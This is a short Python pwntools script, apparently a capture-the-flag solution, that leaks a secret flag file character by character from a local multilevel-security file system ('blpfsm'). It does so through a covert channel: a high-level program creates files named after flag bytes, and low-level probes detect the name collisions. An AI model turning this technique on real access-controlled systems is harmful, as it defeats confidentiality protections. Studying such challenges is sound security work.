from pwn import *
import string

def encode_string(buf: str) -> str:
    buf = buf.replace('\\', '\\\\')
    buf = buf.replace('"', '\\"')
    return '"' + buf + '"'



if __name__ == "__main__":
    p = process(['./backend/build/blpfsm', './test_system'])

    p.recvuntil('> ')
    p.sendline('createfile("tester", 255, 2)')
    flag = ''
    for i in range(30):
        print(i)
        p.recvuntil('> ')
        p.sendline('write("tester", {}, 0)'.format(encode_string(f'createfile(read("flag.txt", {i}, 1), 8, 2)')))
        p.recvuntil('> ')
        p.sendline(f'execute("tester")')
        # p.interactive()
        found = False
        first = True
        for j in string.ascii_letters + '{}':
            if first:
                print(p.recvuntil('> '))
                first = False
            else:
                p.recvuntil('> ')
            p.sendline('createfile("{}", 8, 1)'.format(j))
            p.recvuntil('> ')
            p.sendline('write("{}", "ff\\n", 0)'.format(j))
            p.recvuntil('> ')
            p.sendline('print(read("{}", 0, 2))'.format(j))
            ret = p.recvuntil('> ')
            # print(ret)
            # input()
            if not b'ff' in ret:
                found = True
            p.sendline('remove("{}")'.format(j))
            if found:
                flag += j
                print(flag)
                break
    p.interactive()
